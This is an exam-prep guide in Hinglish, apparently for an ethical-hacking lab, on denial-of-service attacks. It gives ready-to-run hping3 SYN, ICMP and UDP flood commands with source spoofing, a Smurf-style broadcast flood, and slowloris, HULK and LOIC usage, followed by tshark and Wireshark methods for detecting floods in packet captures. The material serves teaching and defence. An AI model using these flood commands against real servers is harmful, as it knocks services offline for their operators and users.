# DoS ATTACK KARO / DETECT KARO

---

## Pehle Samjho: DoS Aur DDoS Kya Hai?

**DoS = Denial of Service.** Matlab target server ko itne zyada requests/packets bhejo ki wo normal users ko serve nahi kar sake — basically website/service DOWN kar do.

**DDoS = Distributed DoS.** Same cheez, lekin multiple machines (botnet) se simultaneously attack. Ek machine se DoS, hazaar machines se DDoS.

**Kaise kaam karta hai (simple example):**
Socho ek restaurant hai jismein 10 tables hain. Tum 100 logon ko bhej do jo order nahi karte — bas table occupy karte hain. Ab real customers ko jagah nahi milegi. Yehi hai DoS!

**Technical terms mein:**
- Server ke paas limited resources hain (CPU, RAM, connections, bandwidth)
- Attacker in resources ko exhaust kar deta hai fake requests se
- Real users ko "service denied" hoti hai

---

## DoS Attack Types — Samjho Sab

| Attack Type | Layer | Kaise Kaam Karta Hai | Tool |
|---|---|---|---|
| **SYN Flood** | Transport (TCP) | Incomplete TCP connections se server overwhelm | hping3 |
| **ICMP Flood** | Network | Bahut saare ping packets bhejo | hping3 |
| **HTTP Flood** | Application | Bahut saare HTTP GET/POST requests | HULK, LOIC |
| **Slowloris** | Application | Slow, incomplete HTTP connections | slowloris |
| **UDP Flood** | Transport | Bahut saare UDP packets random ports pe | hping3 |

### SYN Flood — Detail Mein Samjho
Normal TCP Connection (3-way handshake):
```
Client → SYN → Server        (connection start karna hai)
Client ← SYN-ACK ← Server   (okay, ready)
Client → ACK → Server        (done, connected!)
```

SYN Flood mein:
```
Attacker → SYN → Server      (connection start karna hai)
Attacker ← SYN-ACK ← Server (okay, ready)
Attacker → ❌ ACK NAHI BHEJA! (intentionally ignore)
```
Server wait karta rehta hai ACK ka. Hazaaron aise half-open connections se server ki memory bhar jaati hai!

### Slowloris — Detail Mein Samjho
Slowloris HTTP connection open karta hai lekin bahut slowly data bhejta hai:
```
Attacker: "GET / HTTP/1.1\r\n"
Attacker: "Host: target.com\r\n"
(10 sec baad) "X-header: lol\r\n"
(10 sec baad) "X-header2: lol\r\n"
... kabhi complete nahi karta!
```
Server har connection ke liye thread hold karke rakhta hai. Sab threads busy = nobody else can connect!

---

## CASE 1: SYN Flood — hping3

```bash
# Basic SYN flood
hping3 -S --flood -V -p 80 <TARGET_IP>
# -S        = SYN flag set
# --flood   = maximum speed (no waiting for replies)
# -V        = verbose
# -p 80     = target port 80 (HTTP)

# Random source IP se (harder to block)
hping3 -S --flood -p 80 --rand-source <TARGET_IP>
# --rand-source = har packet ka source IP random

# Specific port pe SYN flood
hping3 -S --flood -p 443 <TARGET_IP>      # HTTPS
hping3 -S --flood -p 21 <TARGET_IP>       # FTP

# Data size bada karo (bandwidth consumption)
hping3 -S --flood -p 80 -d 1000 <TARGET_IP>
# -d 1000 = 1000 bytes data har packet mein

# Specific count bhejo (flood nahi, controlled)
hping3 -S -p 80 -c 10000 <TARGET_IP>
# -c 10000 = sirf 10000 packets bhejo
```

**Output kya dikhega:**
```
HPING target.com (eth0 192.168.1.100): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
--- target.com hping statistic ---
500000 packets transmitted, 0 packets received
```

---

## CASE 2: Slowloris — HTTP Slow Attack

```bash
# Basic Slowloris attack
slowloris <TARGET_IP> -p 80 -s 500
# -p 80   = port
# -s 500  = 500 socket connections

# Ya Python script se:
pip install slowloris
slowloris <TARGET_IP>

# Manual verification:
# Browser mein target open karo — loading... loading... = kaam kar raha hai!
```

**Slowloris kab use karo?** Jab target Apache server hai (Apache per-thread model vulnerable hai). Nginx generally resistant hai.

---

## CASE 3: HULK — HTTP GET Flood

```bash
# HULK script download karo (usually exam mein pehle se hota hai)
python3 hulk.py http://<TARGET_IP>/

# Kya karta hai: Random URLs generate karke GET requests flood karta hai
# Caching bypass karta hai by unique URLs
```

---

## CASE 4: LOIC (Low Orbit Ion Cannon) — GUI Tool

```
1. LOIC application launch karo
2. Target IP ya URL enter karo
3. Port select karo (80 for HTTP)
4. Method select karo:
   - TCP: TCP connection flood
   - UDP: UDP packet flood
   - HTTP: HTTP request flood
5. Threads set karo (jitna zyada, utna intense)
6. "IMMA CHARGIN MAH LAZER" button click karo (Start)
```

**LOIC kab puchha jaata hai?** Exam mein mostly tool identification — "Which tool is used for DoS?" = LOIC, hping3, Slowloris, HULK

---

## CASE 5: ICMP Flood (Ping Flood)

```bash
# hping3 se ICMP flood
hping3 --icmp --flood <TARGET_IP>
# --icmp = ICMP mode (ping packets)

# Smurf-style (broadcast address pe)
hping3 --icmp --flood -a <TARGET_IP> <BROADCAST_IP>
# -a = spoof source IP as target (replies target ko jayengi)

# Simple ping flood (basic but works)
ping -f <TARGET_IP>
# -f = flood mode (Linux only, root needed)
```

---

## CASE 6: UDP Flood

```bash
hping3 --udp --flood -p 53 <TARGET_IP>
# --udp = UDP mode
# -p 53 = DNS port (common target)

hping3 --udp --flood --rand-source -p 80 <TARGET_IP>
```

---

## CASE 7: Detect DoS in PCAP — BAHUT IMPORTANT (Exam Mein Aata Hai!)

### Top Source IPs Dhundho (Flooder Identify Karo)
```bash
tshark -r dos.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -10
```
**Output:**
```
  95000  192.168.1.50    ← YE HAI ATTACKER! Itne packets = flood
    200  192.168.1.1
     50  192.168.1.5
```
Sabse zyada packets = attacker!

### SYN Flood Detect Karo
```bash
# SYN packets count karo (SYN flag ON, ACK flag OFF)
tshark -r dos.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" | wc -l

# Agar number bahut bada hai (thousands+) = SYN FLOOD!

# SYN vs SYN-ACK ratio check karo
tshark -r dos.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" | wc -l    # SYN count
tshark -r dos.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==1" | wc -l    # SYN-ACK count
# SYN >>> SYN-ACK matlab connections complete nahi ho rahe = SYN FLOOD
```

### ICMP Flood Detect Karo
```bash
tshark -r dos.pcap -Y "icmp" | wc -l
# Bahut zyada ICMP packets = ICMP/Ping FLOOD

# ICMP source check karo
tshark -r dos.pcap -Y "icmp.type==8" -T fields -e ip.src | sort | uniq -c | sort -rn | head -5
# icmp.type==8 = echo request (ping)
```

### HTTP Flood Detect Karo
```bash
tshark -r dos.pcap -Y "http.request" | wc -l
# Bahut zyada HTTP requests = HTTP FLOOD

# Source IP per HTTP requests
tshark -r dos.pcap -Y "http.request" -T fields -e ip.src | sort | uniq -c | sort -rn | head -5
```

### Wireshark Mein Visual Detection
```
1. Open PCAP in Wireshark
2. Statistics → Conversations → sort by Packets (descending)
   → top source = attacker
3. Statistics → Protocol Hierarchy
   → agar 95% TCP SYN hai = SYN flood
   → agar 95% ICMP hai = ICMP flood
4. Statistics → I/O Graphs
   → sudden spike in packets = DoS attack timeframe
```

---

## Attack Type Identification — Exam Ke Liye

| PCAP Mein Kya Dikha | Attack Type |
|---|---|
| Bahut saare SYN packets, no ACK | SYN Flood |
| Bahut saare ICMP echo requests | ICMP/Ping Flood |
| Bahut saare HTTP GET requests | HTTP Flood (HULK/LOIC) |
| Slow incomplete HTTP headers | Slowloris |
| Bahut saare UDP packets random ports pe | UDP Flood |
| Same source IP → broadcast → replies to victim | Smurf Attack |

---

## Common Mistakes (Mat Karna Ye)

1. **Target IP galat:** Apne hi machine pe attack mat karo! Target IP double-check karo
2. **--flood bhool gaye:** Bina `--flood` ke hping3 slow bhejta hai — DoS effect nahi hoga
3. **PCAP analysis mein SYN flag check nahi kiya:** `tcp.flags.syn==1 && tcp.flags.ack==0` = SYN only (half-open)
4. **DDoS vs DoS confuse:** Single source IP = DoS, multiple source IPs = DDoS
5. **Slowloris nginx pe try kiya:** Nginx generally Slowloris resistant hai — Apache pe effective hai
6. **PCAP mein sirf packet count dekha:** Top source IP bhi identify karo — wo attacker hai

---

## Quick Decision Tree

```
DoS question aaya?
  │
  ├─ PERFORM DoS attack:
  │    ├─ SYN Flood → hping3 -S --flood -p 80 TARGET
  │    ├─ HTTP Slow → slowloris TARGET -p 80 -s 500
  │    ├─ HTTP GET Flood → HULK / LOIC
  │    ├─ ICMP Flood → hping3 --icmp --flood TARGET
  │    └─ UDP Flood → hping3 --udp --flood TARGET
  │
  ├─ DETECT DoS in PCAP:
  │    ├─ Top source IP: tshark | sort | uniq -c | sort -rn
  │    ├─ SYN flood: tcp.flags.syn==1 && tcp.flags.ack==0 count
  │    ├─ ICMP flood: icmp packet count
  │    ├─ HTTP flood: http.request count
  │    └─ Wireshark: Statistics → Conversations → top talker
  │
  ├─ IDENTIFY attack type:
  │    ├─ SYN packets zyada → SYN Flood
  │    ├─ ICMP zyada → Ping Flood
  │    ├─ HTTP requests zyada → HTTP Flood
  │    └─ Slow connections → Slowloris
  │
  └─ Tool name puchha hai?
       ├─ SYN flood → hping3
       ├─ Slow HTTP → Slowloris
       ├─ HTTP flood → HULK / LOIC
       └─ GUI tool → LOIC
```
